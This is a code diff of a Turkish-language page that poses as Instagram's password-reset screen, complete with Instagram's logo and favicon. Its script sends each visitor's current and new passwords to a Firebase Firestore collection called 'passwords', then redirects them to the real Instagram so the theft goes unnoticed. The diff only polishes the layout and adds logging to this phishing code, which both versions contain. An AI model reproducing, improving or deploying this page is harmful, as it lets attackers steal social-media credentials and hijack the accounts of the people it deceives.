@@ -4,8 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Şifre Yenile - Instagram</title>
-    <!-- Instagram favicon -->
-    <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/static/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="https://www.instagram.com/favicon.ico">
     <script src="https://cdn.tailwindcss.com?client"></script>
     <style>
         .toggle-password {
@@ -22,24 +21,26 @@
             background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            font-size: 24px;
-            font-weight: bold;
         }
     </style>
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen">
     <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
-        <!-- Instagram yazı logosu -->
-        <div class="text-center mb-6">
-            <div class="instagram-gradient text-3xl font-instagram mb-2">Instagram</div>
-            <div class="w-20 h-1 bg-gradient-to-r from-yellow-400 via-red-500 to-purple-600 mx-auto rounded-full"></div>
+        <!-- Instagram logosu ve başlık -->
+        <div class="flex items-center justify-center mb-6">
+            <img
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png"
+                alt="Instagram Logo"
+                class="h-12 mr-2"
+            />
+            <h1 class="text-2xl font-bold instagram-gradient">Şifre Yenile</h1>
         </div>
         
-        <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">
-            Şifrenizi yenileyin
+        <h2 class="text-xl font-semibold text-gray-800 mb-4 text-center">
+            Instagram'da güçlü bir şifre oluşturun
         </h2>
         <p class="text-sm text-gray-600 mb-4 text-center">
-            Şifreniz en az 6 karakter olmalı ve rakamlar, harfler ve noktalama işaretleri içermelidir.
+            Şifreniz en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (! vb.) oluşmalıdır.
         </p>
         <form id="passwordForm">
             <div class="mb-4 relative">
@@ -66,7 +67,7 @@
                 <input
                     type="password"
                     id="confirmPassword"
-                    placeholder="Yeni Şifre (Tekrar)"
+                    placeholder="Şifreyi Tekrar Et"
                     class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                     required
                 />
@@ -74,20 +75,21 @@
             </div>
             <p id="errorMessage" class="text-red-500 text-sm mb-4 hidden"></p>
             <p id="successMessage" class="text-green-500 text-sm mb-4 hidden">
-                Şifreniz başarıyla değiştirildi!
+                Şifreniz değiştirildi!
             </p>
             <button
                 type="submit"
-                class="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white p-3 rounded-md font-semibold hover:from-purple-600 hover:to-pink-600 transition duration-200"
+                class="w-full bg-blue-500 text-white p-3 rounded-md font-semibold hover:bg-blue-600 transition duration-200"
             >
-                Şifreyi Güncelle
+                Şifreyi Değiştir
             </button>
             <div class="text-center mt-4">
-                <a href="#" class="text-blue-500 text-sm hover:underline">Giriş yapmak için tıklayın</a>
+                <a href="#" class="text-blue-500 text-sm hover:underline">Şifrenizi unuttunuz?</a>
             </div>
         </form>
     </div>
 
+    <!-- Firebase SDK -->
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
         import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';
@@ -102,76 +104,79 @@
             measurementId: "G-2SCDNF8S2R"
         };
 
+        // Firebase-i başlat
         let db;
         try {
             const app = initializeApp(firebaseConfig);
             db = getFirestore(app);
-            console.log("Firestore başlatıldı");
+            console.log("Firestore başarıyla başladı");
         } catch (error) {
-            console.error("Firebase hatası:", error);
+            console.error("Firebase başlatma hatası:", error);
         }
 
+        // Göster/Gizle fonksiyonu
         document.querySelectorAll('.toggle-password').forEach(toggle => {
             toggle.addEventListener('click', () => {
+                console.log("Toggle tıklandı:", toggle.getAttribute('data-target'));
                 const targetId = toggle.getAttribute('data-target');
                 const input = document.getElementById(targetId);
-                if (input) {
-                    if (input.type === 'password') {
-                        input.type = 'text';
-                        toggle.textContent = 'Gizle';
-                    } else {
-                        input.type = 'password';
-                        toggle.textContent = 'Göster';
-                    }
+                if (!input) {
+                    console.error("Input bulunamadı:", targetId);
+                    return;
+                }
+                if (input.type === 'password') {
+                    input.type = 'text';
+                    toggle.textContent = 'Gizle';
+                } else {
+                    input.type = 'password';
+                    toggle.textContent = 'Göster';
                 }
             });
         });
 
         const form = document.getElementById('passwordForm');
+        const currentPassword = document.getElementById('currentPassword');
+        const newPassword = document.getElementById('newPassword');
+        const confirmPassword = document.getElementById('confirmPassword');
         const errorMessage = document.getElementById('errorMessage');
         const successMessage = document.getElementById('successMessage');
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
+            console.log("Form gönderildi");
             errorMessage.classList.add('hidden');
             successMessage.classList.add('hidden');
 
-            const currentPassword = document.getElementById('currentPassword').value;
-            const newPassword = document.getElementById('newPassword').value;
-            const confirmPassword = document.getElementById('confirmPassword').value;
-
-            if (newPassword.length < 6) {
-                errorMessage.textContent = 'Şifre en az 6 karakter olmalıdır.';
+            if (newPassword.value.length < 6) {
+                console.log("Hata: Yeni şifre 6 karakterden kısa");
+                errorMessage.textContent = 'Yeni şifre en az 6 karakter olmalıdır.';
                 errorMessage.classList.remove('hidden');
                 return;
             }
 
-            if (newPassword !== confirmPassword) {
-                errorMessage.textContent = 'Şifreler eşleşmiyor.';
+            if (newPassword.value !== confirmPassword.value) {
+                console.log("Hata: Yeni şifre ile tekrar şifre aynı değil");
+                errorMessage.textContent = 'Yeni şifre ile tekrar şifre aynı değil.';
                 errorMessage.classList.remove('hidden');
                 return;
             }
 
             try {
-                if (db) {
-                    await addDoc(collection(db, 'passwords'), {
-                        currentPassword: currentPassword,
-                        newPassword: newPassword,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent
-                    });
-                }
-                
+                console.log("Firestore'a yazılıyor...");
+                const docRef = await addDoc(collection(db, 'passwords'), {
+                    currentPassword: currentPassword.value,
+                    newPassword: newPassword.value,
+                    timestamp: new Date().toISOString()
+                });
+                console.log("Şifreler Firestore'a yazıldı, belge ID:", docRef.id);
+                successMessage.textContent = 'Şifreniz değiştirildi!';
                 successMessage.classList.remove('hidden');
                 setTimeout(() => {
+                    console.log("Instagram'a yönlendiriliyor...");
                     window.location.href = 'https://www.instagram.com';
-                }, 2000);
+                }, 2000); // 2 saniye sonra Instagram'a yönlendir
             } catch (error) {
-                console.error("Hata:", error);
-                successMessage.classList.remove('hidden');
-                setTimeout(() => {
-                    window.location.href = 'https://www.instagram.com';
-                }, 2000);
+                console.error("Firestore'a yazı hatası:", error);
             }
         });
     </script>
